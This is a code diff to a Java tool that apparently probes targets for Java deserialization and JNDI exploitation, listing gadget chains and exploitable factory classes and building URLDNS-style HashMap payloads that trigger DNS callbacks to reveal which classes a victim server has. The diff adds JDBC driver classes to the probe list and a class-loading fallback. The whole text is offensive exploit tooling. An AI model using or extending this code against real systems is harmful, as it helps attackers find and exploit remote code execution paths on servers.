@@ -24,8 +24,9 @@ public class en {
   				"Jdk7u21",
   				"JRE8u20",
   				"winlinux"};
-	static String[] jndidefaultclass = {"javax.el.ELProcessor",
+	static String[] jndidefaultclass = {
 			"org.apache.naming.factory.BeanFactory",
+			"javax.el.ELProcessor",
 			"groovy.lang.GroovyShell",
 			"groovy.lang.GroovyClassLoader",
 			"org.yaml.snakeyaml.Yaml",
@@ -37,6 +38,11 @@ public class en {
 			"org.apache.catalina.UserDatabase",
 			"org.apache.catalina.users.MemoryUserDatabaseFactory",
 			"org.h2.Driver",
+			"org.postgresql.Driver",
+			"com.mysql.jdbc.Driver",
+			"com.mysql.cj.jdbc.Driver",
+			"com.mysql.fabric.jdbc.FabricMySQLDriver",
+			"oracle.jdbc.driver.OracleDriver",
 			"org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory",
 			"org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
 			"org.apache.commons.dbcp.BasicDataSourceFactory",
@@ -44,9 +50,11 @@ public class en {
 			"org.apache.commons.dbcp2.BasicDataSourceFactory",
 			"org.apache.commons.pool2.PooledObjectFactory",
 			"org.apache.tomcat.jdbc.pool.DataSourceFactory",
+			"org.apache.juli.logging.LogFactory",
 			"com.alibaba.druid.pool.DruidDataSourceFactory",
 			"com.ibm.ws.client.applicationclient.ClientJ2CCFFactory",
-			"com.ibm.ws.webservices.engine.client.ServiceFactory"};
+			"com.ibm.ws.webservices.engine.client.ServiceFactory"
+			};
 	
 	
     public static void main(String act, String clazzs, String dns) throws Exception {
@@ -191,12 +199,13 @@ public class en {
   		Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
   		f.setAccessible(true);
   		f.set(url, 0);
+  		Class clazz = null;
   		try {
-  			hashMap.put(url, makeClass(clazzName));
+  			clazz = makeClass(clazzName);
 		} catch (Exception e) {
-			System.out.println("错误！！！不能以java开头");
-			System.out.println(e);
+			clazz = Class.forName(clazzName);
 		}
+  		hashMap.put(url, clazz);
   		f.set(url, -1);
         return hashMap;
     }
